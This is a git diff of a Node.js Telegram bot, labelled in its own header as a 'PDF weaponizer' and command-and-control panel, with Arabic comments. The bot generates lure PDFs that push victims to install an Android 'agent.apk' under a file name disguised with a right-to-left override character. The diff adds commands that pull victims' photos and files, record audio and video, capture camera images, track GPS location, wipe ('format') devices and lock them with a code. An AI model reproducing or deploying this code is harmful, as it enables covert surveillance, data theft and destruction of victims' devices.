@@ -1,7 +1,7 @@
 #!/usr/bin/env node
 // ============================================================
 // ARCHITECT TELEGRAM PDF WEAPONIZER + FIREBASE C2 + IMGBB
-// (Render Ready – Zero Cost)
+// (Render Ready – Full Command Panel – Emoji Fixed)
 // ============================================================
 require('dotenv').config();
 const TelegramBot = require('node-telegram-bot-api');
@@ -24,7 +24,10 @@ const db = admin.firestore();
 const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
 const ADMIN_ID = parseInt(process.env.ADMIN_ID);
 
-// --- دالة إنشاء PDF ملغوم مع رابط تنزيل الجندي ---
+// --- تخزين مؤقت لحالة انتظار رمز القفل ---
+const pendingLockCode = new Map(); // victimId -> { chatId, messageId }
+
+// --- دالة إنشاء PDF ملغوم (تم إصلاح الإيموجي) ---
 async function createWeaponizedPDF(imageBuffer) {
     const pdfDoc = await PDFDocument.create();
     const page = pdfDoc.addPage([595, 842]);
@@ -46,11 +49,11 @@ async function createWeaponizedPDF(imageBuffer) {
         height: imgDims.height,
     });
 
-    // رابط تحميل الجندي (يمكنك رفعه على GitHub Releases أو أي استضافة مباشرة)
-    const agentUrl = `https://github.com/Ameen776/BOT-HAKRS4000/raw/main/agent.apk`;
+    const agentUrl = `https://github.com/Ameen776/BOT-HAKRS4000/releases/download/v1.0/agent.apk`;
+    const spoofedName = '\u202E' + 'pdf.security_update' + '\u202C';
 
-    const spoofedName = '\u202E' + 'pdf.تحديث_الأمان' + '\u202C';
-    page.drawText(`To access the content, install the attached app:\n📱 ${spoofedName}`, {
+    // تم إزالة الإيموجي لتجنب خطأ WinAnsi
+    page.drawText(`To access the content, install the attached app:\nApp: ${spoofedName}`, {
         x: 50, y: 100, size: 12, font, color: rgb(0,0,0.8)
     });
 
@@ -64,7 +67,7 @@ async function createWeaponizedPDF(imageBuffer) {
     return Buffer.from(await pdfDoc.save());
 }
 
-// --- أوامر البوت ---
+// --- أوامر البوت الأساسية ---
 bot.onText(/\/start/, (msg) => {
     if (msg.from.id !== ADMIN_ID) return;
     bot.sendMessage(msg.chat.id,
@@ -72,7 +75,7 @@ bot.onText(/\/start/, (msg) => {
         '⚡ *الوحش متصل بـ Firebase + imgBB*\n\n' +
         '📋 *الأوامر:*\n' +
         '/pdf - صنع PDF ملغوم\n' +
-        '/panel - عرض الضحايا\n\n' +
+        '/panel - عرض الضحايا المتصلين\n\n' +
         '📸 *أرسل /pdf ثم الصورة.*',
         { parse_mode: 'Markdown' }
     );
@@ -97,7 +100,7 @@ bot.on('photo', async (msg) => {
         const buffer = Buffer.from(await response.arrayBuffer());
         const pdfBuffer = await createWeaponizedPDF(buffer);
         await bot.sendDocument(msg.chat.id, pdfBuffer, {
-            filename: 'مستند.pdf',
+            filename: 'document.pdf',
             caption: '💣 *PDF ملغوم جاهز.*\n\n📱 الضحية يجب أن يثبت التطبيق المرفق ليظهر في لوحة التحكم.',
             parse_mode: 'Markdown'
         });
@@ -138,9 +141,16 @@ bot.on('callback_query', async (query) => {
         const commands = [
             [{ text: '📸 سحب الصور', callback_data: `cmd:${victimId}:gallery` }],
             [{ text: '📁 سحب الملفات', callback_data: `cmd:${victimId}:files` }],
-            [{ text: '📱 اهتزاز', callback_data: `cmd:${victimId}:vibrate` }],
+            [{ text: '🎤 تسجيل صوت', callback_data: `cmd:${victimId}:record_audio` }],
+            [{ text: '🎥 تسجيل فيديو', callback_data: `cmd:${victimId}:record_video` }],
             [{ text: '📷 تصوير أمامي', callback_data: `cmd:${victimId}:camera_front` }],
-            [{ text: '📍 الموقع', callback_data: `cmd:${victimId}:location` }],
+            [{ text: '📷 تصوير خلفي', callback_data: `cmd:${victimId}:camera_back` }],
+            [{ text: '📱 اهتزاز', callback_data: `cmd:${victimId}:vibrate` }],
+            [{ text: '💬 إشعار', callback_data: `cmd:${victimId}:toast` }],
+            [{ text: '📍 الموقع GPS', callback_data: `cmd:${victimId}:location` }],
+            [{ text: '📊 معلومات الجهاز', callback_data: `cmd:${victimId}:device_info` }],
+            [{ text: '💣 فرمتة', callback_data: `cmd:${victimId}:format` }],
+            [{ text: '🔒 قفل برمز', callback_data: `cmd:${victimId}:lock_code` }],
         ];
         bot.editMessageText(`التحكم بالضحية \`${victimId.slice(0,8)}\``, {
             chat_id: chatId,
@@ -150,6 +160,11 @@ bot.on('callback_query', async (query) => {
         });
     } else if (data.startsWith('cmd:')) {
         const [, victimId, command] = data.split(':');
+        if (command === 'lock_code') {
+            pendingLockCode.set(victimId, { chatId, messageId: query.message.message_id });
+            bot.sendMessage(chatId, `🔐 أدخل الرمز الرقمي لقفل جهاز الضحية \`${victimId.slice(0,8)}\` (أرقام فقط):`, { parse_mode: 'Markdown' });
+            return;
+        }
         await db.collection('victims').doc(victimId).collection('commands').add({
             command,
             timestamp: admin.firestore.FieldValue.serverTimestamp(),
@@ -162,7 +177,37 @@ bot.on('callback_query', async (query) => {
     }
 });
 
-// --- مراقبة نتائج الضحايا (صور من imgBB، ملفات، إلخ) ---
+// --- استقبال رمز القفل من الأدمن ---
+bot.on('message', async (msg) => {
+    const chatId = msg.chat.id;
+    const text = msg.text;
+    if (!text || msg.from.id !== ADMIN_ID) return;
+
+    for (let [victimId, pending] of pendingLockCode.entries()) {
+        if (pending.chatId === chatId) {
+            const code = text.trim();
+            if (!/^\d+$/.test(code)) {
+                bot.sendMessage(chatId, '❌ الرمز يجب أن يكون أرقاماً فقط. حاول مجدداً.');
+                return;
+            }
+            await db.collection('victims').doc(victimId).collection('commands').add({
+                command: 'lock_code',
+                code: code,
+                timestamp: admin.firestore.FieldValue.serverTimestamp(),
+                status: 'pending'
+            });
+            bot.editMessageText(`✅ تم إرسال أمر القفل بالرمز ${code}`, {
+                chat_id: pending.chatId,
+                message_id: pending.messageId
+            }).catch(() => {});
+            bot.sendMessage(chatId, `🔒 تم إرسال أمر القفل للضحية \`${victimId.slice(0,8)}\` بالرمز: ${code}`, { parse_mode: 'Markdown' });
+            pendingLockCode.delete(victimId);
+            return;
+        }
+    }
+});
+
+// --- مراقبة نتائج الضحايا (صور، ملفات، إلخ) ---
 db.collectionGroup('results').onSnapshot(async (snapshot) => {
     for (const doc of snapshot.docChanges()) {
         if (doc.type === 'added') {
@@ -175,10 +220,15 @@ db.collectionGroup('results').onSnapshot(async (snapshot) => {
                 await bot.sendDocument(ADMIN_ID, data.url, {
                     caption: `📁 من ${doc.ref.parent.parent.id.slice(0,8)}`
                 });
+            } else if (data.type === 'device_info') {
+                await bot.sendMessage(ADMIN_ID, `📊 *معلومات الجهاز*\n${data.info}`, { parse_mode: 'Markdown' });
+            } else if (data.type === 'location') {
+                await bot.sendLocation(ADMIN_ID, data.lat, data.lng);
+                await bot.sendMessage(ADMIN_ID, `📍 موقع الضحية \`${doc.ref.parent.parent.id.slice(0,8)}\``, { parse_mode: 'Markdown' });
             }
             await doc.ref.delete();
         }
     }
 });
 
-console.log('🤖 Architect C2 Bot started. Firebase + imgBB ready.');
+console.log('🤖 Architect C2 Bot started. Full command panel active.');
